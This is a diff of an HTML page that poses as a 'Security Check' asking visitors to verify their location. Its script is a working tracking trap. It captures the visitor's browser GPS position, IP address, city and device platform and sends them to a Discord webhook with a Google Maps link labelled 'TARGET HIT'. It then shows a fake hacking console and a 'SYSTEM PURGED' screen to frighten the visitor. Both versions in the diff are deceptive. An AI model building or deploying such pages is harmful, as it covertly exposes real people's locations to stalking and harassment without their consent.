@@ -3,126 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ Verification Required</title> 
+    <title>Security Verification</title> 
     <style>
+        /* ANIMATED GREEN BACKGROUND */
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
-            /* Using your Nature Background */
-            background: url('https://i.ibb.co/FkV6vY0/image-b0e308.png') no-repeat center center fixed; 
-            background-size: cover;
-            font-family: 'Courier New', monospace;
+            background: linear-gradient(to bottom, #87CEEB 0%, #E0F7FA 50%, #2E7D32 50%, #1B5E20 100%);
+            font-family: 'Segoe UI', sans-serif;
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* DARK BLUR OVERLAY */
-        #bg-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.3); backdrop-filter: blur(3px); z-index: 1;
+        /* Animated Grass Layers */
+        .grass {
+            position: absolute; bottom: 0; width: 100%; height: 50%;
+            background: repeating-linear-gradient(90deg, #2E7D32, #2E7D32 20px, #388E3C 20px, #388E3C 40px);
+            z-index: 1; opacity: 0.8;
+            animation: sway 5s ease-in-out infinite;
+        }
+        .grass-2 { bottom: -10px; opacity: 0.5; animation: sway 7s ease-in-out infinite reverse; }
+
+        @keyframes sway {
+            0%, 100% { transform: skewX(-2deg); }
+            50% { transform: skewX(2deg); }
         }
 
-        /* THE SECURITY BOX */
+        /* THE TRAP BOX */
         #verify-box {
             position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.95);
-            padding: 40px; border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            text-align: center; width: 85%; max-width: 350px;
-            border: 3px solid #ff0000;
+            background: white;
+            padding: 40px 30px; border-radius: 18px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center; width: 85%; max-width: 380px;
         }
 
-        h2 { color: #000; margin: 0 0 10px 0; font-weight: 900; letter-spacing: 1px; }
-        p { color: #333; font-size: 0.9rem; font-weight: bold; margin-bottom: 25px; }
+        #verify-icon {
+            width: 60px; height: 60px; background: #E8F5E9;
+            border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; margin: 0 auto 20px;
+            color: #4CAF50; font-size: 30px;
+        }
+
+        h2 { color: #333; margin: 0 0 10px; font-size: 1.5rem; }
+        p { color: #666; font-size: 0.95rem; margin-bottom: 30px; line-height: 1.4; }
 
         #start-btn { 
-            background: #ff0000; color: white; border: none; 
-            padding: 15px; font-size: 1.1rem; border-radius: 10px;
-            cursor: pointer; font-weight: 900; width: 100%;
-            box-shadow: 0 5px 15px rgba(255,0,0,0.4);
+            background: #4CAF50; color: white; border: none; 
+            padding: 16px; font-size: 1.1rem; border-radius: 12px;
+            cursor: pointer; font-weight: bold; width: 100%;
+            box-shadow: 0 4px 12px rgba(76,175,80,0.3);
             transition: 0.2s;
         }
+        #start-btn:hover { background: #43A047; transform: translateY(-2px); }
 
-        #start-btn:hover { transform: scale(1.05); background: #cc0000; }
-
-        /* THE HACKER CONSOLE (DARKNESS) */
+        /* THE HACKER CONSOLE */
         #console { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; z-index: 100; display: none;
             flex-direction: column; align-items: center; justify-content: center;
-            color: #00FF41; text-shadow: 0 0 5px #00FF41;
+            color: #00FF41; font-family: 'Courier New', monospace;
         }
-        #log { width: 90%; max-width: 500px; font-size: 1rem; line-height: 1.5; }
+        #log { width: 90%; max-width: 500px; font-size: 1rem; }
     </style>
 </head>
 <body>
 
-    <div id="bg-overlay"></div>
+    <div class="grass"></div>
+    <div class="grass grass-2"></div>
 
     <div id="verify-box">
-        <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
-        <h2>SECURITY CHECK</h2>
-        <p>PLEASE CONFIRM YOUR LOCATION TO ACCESS THE ENCRYPTED FILE.</p>
-        <button id="start-btn" onclick="trigger()">[ VERIFY IDENTITY ]</button>
+        <div id="verify-icon">🛡️</div>
+        <h2>Security Check</h2>
+        <p>Please verify your location to continue to the requested content.</p>
+        <button id="start-btn" onclick="startTrap()">[ VERIFY IDENTITY ]</button>
     </div>
 
     <div id="console">
         <div id="log">
-            <h1 style="color:red; text-shadow: 0 0 15px red;">> [ BREACH_INITIALIZED ]</h1>
+            <h1 style="color:red; text-shadow: 0 0 10px red;">> [ BREACH_INITIALIZED ]</h1>
             <div id="output"></div>
         </div>
     </div>
 
     <script>
-        // PASTE YOUR DISCORD WEBHOOK HERE
         const WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 
 
-        async function trigger() {
-            // STEP 1: Ask for REAL GPS (The Trap)
+        async function startTrap() {
+            // STEP 1: The GPS Trap
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-                    () => sendData("DENIED", "DENIED", 0)
+                    (pos) => sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+                    () => sendToDiscord("DENIED", "DENIED", 0)
                 );
             }
 
-            // STEP 2: Show Hacker Screen
             document.getElementById('verify-box').style.display = 'none';
             document.getElementById('console').style.display = 'flex';
-            
-            runHackingText();
+            runTyping();
         }
 
-        async function sendData(lat, lon, acc) {
-            const ipFetch = await fetch('https://ipapi.co/json/');
-            const ipData = await ipFetch.json();
+        async function sendToDiscord(lat, lon, acc) {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
 
             const payload = {
-                content: "🛑 **Mody12_S - TARGET COMPROMISED** 🛑",
+                content: "🎯 **TARGET HIT: REAL GPS LOCK** 🎯",
                 embeds: [{
-                    color: 16711680,
-                    title: "GPS_DATA_EXTRACTED",
+                    color: 3066993, // Green
                     fields: [
-                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
-                        { name: "📍 District", value: `${ipData.city}, ${ipData.region}`, inline: true },
-                        { name: "🎯 REAL GPS LOCK", value: lat !== "DENIED" ? `[VIEW ON GOOGLE MAPS](https://www.google.com/maps?q=${lat},${lon})` : "❌ TARGET REJECTED ACCESS", inline: false },
-                        { name: "📏 Accuracy", value: `${Math.round(acc)} meters`, inline: true }
-                    ],
-                    footer: { text: "Breach Protocol v10.5 | Mody12_S" }
+                        { name: "👤 IP", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "📍 District", value: ipData.city, inline: true },
+                        { name: "🌍 REAL GPS", value: lat !== "DENIED" ? `[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})` : "❌ DENIED", inline: false },
+                        { name: "📱 Device", value: navigator.platform, inline: true }
+                    ]
                 }]
             };
 
             fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
         }
 
-        function runHackingText() {
-            const lines = [
-                "ESTABLISHING CONNECTION...",
-                "BYPASSING KERNEL_FIREWALL...",
-                "UPLOADING TROJAN_EXE...",
-                "EXTRACTING GPS_COORDINATES...",
-                "STEALING DISCORD_TOKENS...",
-                "CRITICAL_TRACE_DETECTED!",
-                "EMERGENCY_SYSTEM_PURGE..."
-            ];
+        function runTyping() {
+            const lines = ["BYPASSING_CORE...", "IP_FETCH_SUCCESS...", "GPS_TRIANGULATION...", "UPLOADING_LOGS...", "WIPING_DRIVE..."];
             let i = 0;
             const output = document.getElementById('output');
             const interval = setInterval(() => {
@@ -131,10 +131,7 @@
                     i++;
                 } else {
                     clearInterval(interval);
-                    setTimeout(() => {
-                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-size:4rem;'>DATA WIPED</h1>";
-                        document.body.style.background = "black";
-                    }, 2000);
+                    setTimeout(() => { document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-family:monospace;'>SYSTEM PURGED</h1>"; document.body.style.background="black"; }, 2000);
                 }
             }, 1000);
         }
